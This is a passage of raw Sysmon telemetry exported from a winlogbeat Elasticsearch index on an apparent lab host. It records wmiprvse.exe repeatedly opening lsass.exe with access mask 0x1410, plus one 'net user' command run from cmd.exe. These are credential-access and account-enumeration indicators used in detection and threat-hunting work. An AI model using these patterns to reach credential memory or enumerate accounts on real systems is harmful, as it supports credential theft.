                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:28.647"
                },
                "time_created": "2020-05-29T16:36:28.661472"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331131",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:28.709"
                },
                "time_created": "2020-05-29T16:36:28.713150"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331132",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:31.755"
                },
                "time_created": "2020-05-29T16:36:31.756536"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331133",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:31.802"
                },
                "time_created": "2020-05-29T16:36:31.807238"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331134",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "net  user",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\Users\\Niubbo\\Desktop\\",
                    "Description": "Net Command",
                    "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)",
                    "Hashes": "MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B",
                    "Image": "C:\\Windows\\System32\\net.exe",
                    "IntegrityLevel": "Medium",
                    "LogonGuid": "{b9db5ea0-7df1-5ecb-0000-002061ac0d00}",
                    "LogonId": "0x00000000000dac61",
                    "OriginalFileName": "net.exe",
                    "ParentCommandLine": "\"cmd.exe\"",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentProcessGuid": "{b9db5ea0-3a06-5ed1-0000-00100e539c0c}",
                    "ParentProcessId": "10388",
                    "ProcessGuid": "{b9db5ea0-3a12-5ed1-0000-0010f3749c0c}",
                    "ProcessId": "4228",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 16:36:34.127"
                },
                "time_created": "2020-05-29T16:36:34.132103"
            }
        },
        "_type": "_doc"
    },
